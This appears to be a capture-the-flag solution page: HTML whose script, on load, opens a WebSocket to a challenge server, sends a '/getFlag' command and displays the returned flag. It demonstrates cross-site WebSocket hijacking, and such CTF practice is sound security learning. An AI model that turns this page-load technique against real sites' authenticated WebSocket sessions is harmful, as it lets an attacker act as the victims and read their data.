<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Exploit</title>
    <style>
        #log {
            border: 1px solid #ccc;
            padding: 10px;
            height: 300px;
            overflow-y: auto;
            margin: 20px 0;
            background-color: #f5f5f5;
            font-family: monospace;
        }
        .flag {
            color: red;
            font-weight: bold;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h1>WebSocket Flag Capture</h1>
    <div id="log"></div>
    
    <script>
        // Função para adicionar mensagens ao log
        function log(message, isFlag = false) {
            const logElement = document.getElementById('log');
            const entry = document.createElement('div');
            if (isFlag) entry.className = 'flag';
            entry.textContent = new Date().toLocaleTimeString() + ': ' + message;
            logElement.appendChild(entry);
            
            // Também exibir no console para debug
            console.log(message);
        }
        
        // Conexão automática ao carregar a página
        window.onload = function() {
            log('Página carregada, tentando estabelecer conexão...');
            
            try {
                // Criar conexão WebSocket
                const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
                
                // Manipulador de evento de conexão aberta
                socket.onopen = function() {
                    log('Conexão WebSocket estabelecida com sucesso!');
                    
                    // Enviar comando para obter a flag após um pequeno atraso
                    setTimeout(function() {
                        log('Enviando comando /getFlag...');
                        socket.send(JSON.stringify({
                            sender: 'user',
                            message: '/getFlag'
                        }));
                    }, 500);
                };
                
                // Manipulador de mensagens recebidas
                socket.onmessage = function(event) {
                    const data = JSON.parse(event.data);
                    log('Mensagem recebida: ' + data.message);
                    
                    // Destacar se for a flag
                    if (data.message && data.message.includes('Flag:')) {
                        log('FLAG ENCONTRADA: ' + data.message, true);
                    }
                };
                
                // Manipuladores de erro e fechamento
                socket.onerror = function(error) {
                    log('ERRO: Problema na conexão WebSocket: ' + error);
                };
                
                socket.onclose = function() {
                    log('Conexão WebSocket fechada');
                };
            } catch (error) {
                log('ERRO: Exceção ao configurar WebSocket: ' + error.message);
            }
        };
    </script>
</body>
</html>
